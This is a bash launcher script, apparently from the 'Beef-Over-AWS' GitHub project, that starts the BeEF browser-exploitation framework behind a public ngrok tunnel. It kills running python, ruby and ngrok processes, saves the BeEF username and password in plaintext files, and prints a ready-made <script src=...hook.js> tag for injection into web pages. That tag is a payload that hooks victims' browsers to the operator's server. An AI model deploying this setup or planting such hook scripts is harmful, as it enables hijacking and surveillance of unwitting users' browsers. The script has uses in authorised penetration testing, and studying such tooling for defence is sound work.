#!/bin/bash

if [[ $(whoami) == "root" ]];then
	echo -e "`tput setaf 196`[-]Please run this script without root privilages..\n\n~Beef Over Aws~"
	exit
fi

echo "${yellow}Killing Python.."
killall -9 python3 
echo "${yellow}Killing Ruby.."
killall -9 ruby
echo "${yellow}Killing Ngrok.."
killall -9 ngrok 
sleep 3
clear



url="http://localhost:4040/api/tunnels"
port_number_default=3000
FILE="links/username.txt"
FILE1="links/password.txt"
NON_FIRST_RUN_USERNAME="cat links/username.txt"
NON_FIRST_RUN_PASSWORD="cat links/password.txt"
function banner(){
	clear
	colors
	echo -e "${yellow}    ____            ____      ____                        ___ _       _______"
	echo -e "${yellow}   / __ )___  ___  / __/     / __ \_   _____  _____      /   | |     / / ___/"
	echo -e "${yellow}  / __  / _ \/ _ \/ /_______/ / / / | / / _ \/ ___/_____/ /| | | /| / /\__ \ "
	echo -e "${yellow} / /_/ /  __/  __/ __/_____/ /_/ /| |/ /  __/ /  /_____/ ___ | |/ |/ /___/ /" 
	echo -e "${yellow}/_____/\___/\___/_/        \____/ |___/\___/_/        /_/  |_|__/|__//____/\n\n"  
	echo -e "${purple}		         	Github:AzizKpln"
	echo -e "${purple}	 	         	Author:Aziz Kaplan"                                                    
	echo -e "${purple}		         	Version:2.3\n"
	
	
}
function colors(){
	lightblue=`tput setaf 14` 
	green=`tput setaf 46`     
	RED=`tput setaf 196`      
	yellow=`tput setaf 11`    
	purple=`tput setaf 129`   
	reset=`tput sgr0`
}
function language(){
	colors
	banner
	echo -e "${red}[!]${purple}Choose A Language:\n"
	echo -e "1-Turkish"
	echo -e "2-English\n\n"
	read -p "$(echo -e '\n\n')${lightblue}BeefOverAWS${purple}@${green}$(whoami)${RED}[${reset}~${RED}]${purple}" lang
	if [ $lang -ne 1 ] &&[ $lang -ne 2 ];then
		echo "${purple}[!]${red}Please enter a valid value!"
		exit
	fi
}
function username_password(){
	clear
	colors
	banner
	if [[ $lang -eq 2 ]];then
		clear
		banner
		if [ ! -f $FILE ] && [ ! -f $FILE1 ];then
			echo -e "${lightblue}[+]Looks like you're running this script for the first time.\n"
			echo -e "${lightblue}[+]You have to setup a username and password for the 'Beef' first.\n\n"
			echo -e "${green}[+]${lightblue}Input A Username For Beef-Xss:\n"
			read -p "$(echo -e '\n\n')${lightblue}BeefOverAWS${purple}@${green}$(whoami)${RED}[${reset}~${RED}]${purple}" username
			echo -e "\n\n${green}[+]${lightblue} Input A Password For Beef-Xss:\n"
			read -p "$(echo -e '\n\n')${lightblue}BeefOverAWS${purple}@${green}$(whoami)${RED}[${reset}~${RED}]${purple}" password
			if [[ $username == "" ]];then
				echo -e "${RED}Username Or Password Can't Be Empty!"
				exit
				
			fi
			if [[ $password == "" ]];then
				echo -e "${RED}Username Or Password Can't Be Empty!"
				exit
			fi
			echo $username > $FILE
			echo $password > $FILE1
			echo -e "\n\n${green}[+]${lightblue} Beef Account Settings Saved. Please Run The Script Again:\n"
			exit
		else
			username=$($NON_FIRST_RUN_USERNAME)
			password=$($NON_FIRST_RUN_PASSWORD)
		fi
	elif [[ $lang -eq 1 ]];then
		clear
		banner
		if [ ! -f $FILE ] && [ ! -f $FILE1 ];then
			echo -e "${lightblue}[+]Görünüşe Bakilirsa Dosyayi Ilk Defa caliştiriyorsun.\n"
			echo -e "${lightblue}[+]'Beef' Icin Bir Parola ve Username Secmen Gerekli.\n\n"
			echo -e "${green}[+]${lightblue}Beef-Xss Icin Bir Username Gir:\n"
			read -p "$(echo -e '\n\n')${lightblue}BeefOverAWS${purple}@${green}$(whoami)${RED}[${reset}~${RED}]${purple}" username
			echo -e "\n\n${green}[+]${lightblue} Beef-Xss Icin Bir Parola Gir:\n"
			read -p "$(echo -e '\n\n')${lightblue}BeefOverAWS${purple}@${green}$(whoami)${RED}[${reset}~${RED}]${purple}" password
			if [[ $username == "" ]];then
				echo -e "${RED}Username Veya Parola Boş Birakilmaz!!"
				exit
			fi
			if [[ $password == "" ]];then
				echo -e "${RED}Username Veya Parola Boş Birakilmaz!!"
				exit
			fi
			
			echo $username > $FILE
			echo $password > $FILE1
			echo -e "\n\n${green}[+]${lightblue} Beef Icin Hesap Ayarlari Başariyla Oluşturuldu. Script'i Yeniden caliştirin.\n"
			exit
		else
			username=$($NON_FIRST_RUN_USERNAME)
			password=$($NON_FIRST_RUN_PASSWORD)
		fi
	fi
}
function write_(){
	
	
	sleep 5 
	ngrok_url=$(wget -qO - $url | cut -d ":" -f 6 | cut -d "," -f 1 | tr -d '/"')
	echo $ngrok_url > links/link.txt
	echo "HTTP URL: http://$ngrok_url" > links/links.txt
	echo "HTTPS URL: https://$ngrok_url" >> links/links.txt
	echo "BEEF HOOK URL: http://$ngrok_url:80/hook.js" >> links/links.txt
	echo "BEEF PANEL URL: http://$ngrok_url/ui/panel" >> links/links.txt
	echo 'BEEF FAST JAVASCRIPT CODE: <script src="http://'$ngrok_url':80/hook.js"></script>' >> links/links.txt
	echo "BEEF USERNAME: $username" >> links/links.txt
	echo "BEEF PASSWORD: $password" >> links/links.txt
	echo "Wait for 5 seconds before opening the links"
	if [[ $port_number == "" ]];then
		echo "BEEF PORT NO: 3000" >> links/links.txt
	else
		echo "BEEF PORT NO: $port_number" >> links/links.txt
	fi
	echo -e "\n\n~Beef Over AWS~" >> links/links.txt
	echo -e "https://www.github.com/AzizKpln/Beef-Over-AWS" >> links/links.txt
	echo $ngrok_url > links/domain.txt
	echo $port_number > links/port_number.txt
	echo ${green}
	
	sleep 3
	
	
		
}
function main(){
	
	colors
	language
	username_password
	
	if [ $lang -eq 2 ];then
		clear
		banner
		echo -e "${purple}[!]${green} Input The Port Number You Wanna Run Beef On: [Default:3000]:\n"
		read -p "$(echo -e '\n\n')${lightblue}BeefOverAWS${purple}@${green}$(whoami)${RED}[${reset}~${RED}]${purple}" port_number
		
		clear
		banner
		if [[ $port_number == "" ]];then
			echo "3000" > links/port_
			echo "Port Number:3000"
			port_number=3000
			./ngrok/ngrok http $port_number_default > /dev/null &
		else
			echo $port_number > links/port_
			echo "Port Number:$port_number"	
			./ngrok/ngrok http $port_number > /dev/null &
		fi
		echo ${green}
		write_
		rm beef/config.yaml
		./config/config.sh
		echo "HTTP URL: http://$ngrok_url" 
		echo "HTTPS URL: https://$ngrok_url" 
		echo "BEEF HOOK URL: http://$ngrok_url:80/hook.js"
		echo "BEEF PANEL URL: http://$ngrok_url/ui/panel"
		echo 'BEEF JAVASCRIPT CODE: <script src="http://'$ngrok_url':80/hook.js"></script>' 
		echo "BEEF USERNAME: $username"
		echo "BEEF PASSWORD: $password"
		sleep 2
		if [[ $port_number == "" ]];then
			
			cd beef/ && ./beef 
			
		else
			cd beef/ && ./beef -p  $port_number 
		fi
		
		
	elif [ $lang -eq 1 ];then
		clear
		banner
		echo -e "${purple}[!]${green} Beef'in calişacagi Port'u Giriniz: [varsayilan:3000]:\n"
		read -p "$(echo -e '\n\n')${lightblue}BeefOverAWS${purple}@${green}$(whoami)${RED}[${reset}~${RED}]${purple}" port_number
		
		clear
		banner
		if [[ $port_number == "" ]];then
			echo "3000" > links/port_
			echo "Port Number:3000"
			port_number=3000
			./ngrok/ngrok http $port_number_default > /dev/null &
		else
			echo $port_number > links/port_
			echo "Port Number:$port_number"	
			./ngrok/ngrok http $port_number > /dev/null &
		fi
		echo ${green}
		write_
		rm beef/config.yaml
		./config/config.sh
		echo "HTTP URL: http://$ngrok_url" 
		echo "HTTPS URL: https://$ngrok_url" 
		echo "BEEF HOOK URL: http://$ngrok_url:80/hook.js"
		echo "BEEF PANEL URL: http://$ngrok_url/ui/panel"
		echo 'BEEF JAVASCRIPT KODU: <script src="http://'$ngrok_url':80/hook.js"></script>' 
		echo "BEEF KULLANICI ADI: $username"
		echo "BEEF PAROLA: $password"
		echo "Linkleri acmadan once 5 saniye kadar bekleyin."
		if [[ $port_number == "" ]];then
			
			cd beef/ && ./beef 
			
		else
			cd beef/ && ./beef -p  $port_number 
		fi
		sleep 5
	
		
	fi

	
	
}	

main
